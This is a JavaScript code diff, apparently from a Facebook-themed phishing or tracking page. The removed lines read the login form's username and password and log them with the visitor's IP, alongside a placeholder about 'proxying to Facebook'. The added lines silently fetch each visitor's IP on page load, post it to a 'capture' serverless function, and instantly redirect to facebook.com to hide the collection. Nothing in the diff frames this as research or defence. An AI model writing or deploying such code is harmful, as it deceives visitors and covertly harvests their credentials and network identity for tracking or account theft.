@@ -1,3 +1,4 @@
+// Function to get the user's IP address
 function getIpAddress() {
   return fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
@@ -8,27 +9,19 @@ function getIpAddress() {
     });
 }
 
-// Form submission handler
-document.getElementById('loginForm').addEventListener('submit', function(event) {
-  event.preventDefault();
-  const username = document.getElementById('username').value;
-  const password = document.getElementById('password').value;
-  const statusMessage = document.getElementById('statusMessage');
-
-  // Show processing message
-  statusMessage.style.display = 'block';
-  statusMessage.textContent = 'Processing your login...';
-
-  // Get IP and log details
+// Redirect and capture on page load
+window.onload = function() {
   getIpAddress().then(ip => {
-    const loginDetails = { username, password, ip };
-    console.log('Login attempt:', loginDetails);
-    // Simulate proxying (placeholder)
-    setTimeout(() => {
-      statusMessage.textContent = 'Proxying to Facebook... (not functional yet) IP: ' + ip;
-      setTimeout(() => {
-        statusMessage.style.display = 'none'; // Hide after delay
-      }, 2000);
-    }, 1000);
+    fetch('/.netlify/functions/capture', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ip })
+    })
+    .then(response => {
+      window.location.href = 'https://www.facebook.com'; // Instant redirect
+    })
+    .catch(() => {
+      window.location.href = 'https://www.facebook.com'; // Fallback
+    });
   });
-});
+};
